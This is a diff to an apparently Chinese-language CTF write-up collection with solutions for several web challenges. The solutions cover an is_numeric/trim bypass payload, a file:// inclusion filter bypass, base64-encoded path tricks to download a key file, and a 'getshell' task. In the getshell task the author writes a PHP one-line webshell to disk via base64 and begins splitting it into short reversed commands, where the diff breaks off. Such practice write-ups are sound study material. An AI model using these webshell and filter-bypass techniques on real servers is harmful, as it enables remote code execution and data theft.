@@ -1,6 +1,6 @@
 # 云演Web题库
 
-`更新时间 2024-4-25`
+`更新时间 2024-4-28`
 
 ---
 
@@ -299,7 +299,7 @@ if(is_numeric($_REQUEST['number']))
    $info="sorry, you cann't input a number!";
  
 }
-//$req['number']的值需要等于其int值
+//将$req['number']转换为int，再转换为string后依然等于$req['number']
 elseif($req['number']!=strval(intval($req['number'])))
 {
 
@@ -320,7 +320,7 @@ else
      }
      else
      {
-        //$_REQUEST['number']本身不能为回文字符串
+        //$req['number']本身不能为回文字符串
           if(is_palindrome_number($req["number"])){
             header("hint4:07a9fe2942fe2e1e1db77aaa525e51d0.txt");
               $info = "nice! {$value1} is a palindrome number!"; 
@@ -336,4 +336,101 @@ else
 echo $info;
 ```
 
-- 根据审计结果，需要通过GET方式传入一个参数number，number中的任何双引号前面都会添加反斜杠，
+- 根据审计结果，需要通过GET方式传入一个参数number，该参数不能为字符串，但是后续需要转换为int，不能实际使用字符串，代码使用 `is_numeric()` 函数判断，使用 `%00` 绕过，接着，参数的int值需要是回文，而本身不能为回文，则考虑在数字前添加特殊字符，考虑到参数会经过一层 `trim()` 函数，则需要一个既能绕过 `trim()` ，在转换为int后又会消失的特殊字符，使用 `%0c` 分页符，最后得到的payload为 `%00%0c1`
+
+> <img src="./IMG/Screenshot 2024-04-28 185832.png">
+
+# php4fun
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/38`
+
+考点：文件包含
+
+- 打开网页，进入index.bak
+
+> <img src="./IMG/Screenshot 2024-04-28 190517.png">
+
+- 写得是一言难尽，大概是将file:///、php://、data://之类的过滤了，仔细观察，发现file://没有被过滤，则payload为 `file://localhost/flag`
+
+> <img src="./IMG/Screenshot 2024-04-28 190903.png">
+
+# 这里有几首歌
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/39`
+
+考点：base64
+
+- 进入网页，有两个下载链接，疑似base64编码，对其一解码后得到choubaguai.mp3
+
+> <img src="./IMG/Screenshot 2024-04-28 191827.png">
+
+> <img src="./IMG/Screenshot 2024-04-28 191838.png">
+
+- 对index.php和download.php进行编码，并传入下载url，download.php下载成功
+
+```php
+<?php
+error_reporting(0);
+include("hereiskey.php");
+$url=base64_decode($_GET[url]);
+if( $url=="hereiskey.php" || $url=="choubaguai.mp3" || $url=="One Love.mp3" || $url=="download.php"){
+	$file_size = filesize($url);
+	header ( "Pragma: public" );
+	header ( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );
+	header ( "Cache-Control: private", false );
+	header ( "Content-Transfer-Encoding: binary" );
+	header ( "Content-Type:audio/mpeg MP3");
+	header ( "Content-Length: " . $file_size);
+	header ( "Content-Disposition: attachment; filename=".$url);
+	echo(file_get_contents($url));
+	exit;
+}
+else {
+	echo "Access Forbidden!";
+}
+?>
+```
+
+- 在代码中发现hereiskey.php，对其编码并下载，得到flag
+
+> <img src="./IMG/Screenshot 2024-04-28 192328.png">
+
+# getshell
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/40`
+
+考点：代码审计
+
+- 进入网页，直接开始代码审计
+
+```php
+<?php
+show_source(__FILE__);
+error_reporting(0);
+//存在参数1，字符串长度小于8
+if(strlen($_GET[1])<8){
+    //以shell执行参数内容
+     echo shell_exec($_GET[1]);
+}
+?>
+```
+
+- 构建一句话木马，首先将生成一句话木马的代码准备好
+
+```php
+<?php echo shell_exec($_GET[1]);
+```
+
+- 使用base64编码，并构建生成代码
+
+```shell
+echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWzFdKTs=|base64 -d>a.php
+```
+
+- 倒序，并分隔为7个字符，并为所有字符添加 `\`
+
+```shell
+# php.a>d- 46esab|=sTKdFzWUV0RfRCKjVGel9FbsVGazByboNWZgAHaw9DP ohce
+>ph
+>p.
+```
